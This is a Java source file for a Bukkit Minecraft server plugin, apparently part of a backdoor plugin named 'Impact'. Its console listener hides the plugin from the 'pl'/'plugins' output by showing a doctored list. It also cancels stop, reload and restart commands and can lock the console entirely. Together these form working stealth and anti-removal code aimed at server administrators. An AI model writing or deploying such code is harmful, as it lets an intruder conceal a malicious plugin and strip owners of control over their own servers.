package de.impact.listeners;

import de.impact.utils.LockUtils;
import de.impact.utils.PluginUtils;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

public class ConsoleListener implements Listener {

    @EventHandler
    public void onConsole(ServerCommandEvent e) {

        var msg = e.getCommand().toUpperCase();

        if(LockUtils.isLocked("pluginlist") && (msg.startsWith("PL") || msg.startsWith("PLUGINS") || msg.startsWith("BUKKIT:PLUGINS") || msg.startsWith("BUKKIT:PL"))) {
            e.setCancelled(true);
            Bukkit.getConsoleSender().sendMessage(PluginUtils.getPluginListExceptImpact());
        }

        if(LockUtils.isLocked("stop") && (msg.startsWith("STOP") || msg.startsWith("RL") || msg.startsWith("RELOAD") || msg.startsWith("RESTART") || msg.startsWith("BUKKIT:RL") || msg.startsWith("BUKKIT:RELOAD")))
            e.setCancelled(true);

        if(LockUtils.isLocked("console"))
            e.setCancelled(true);

    }

}
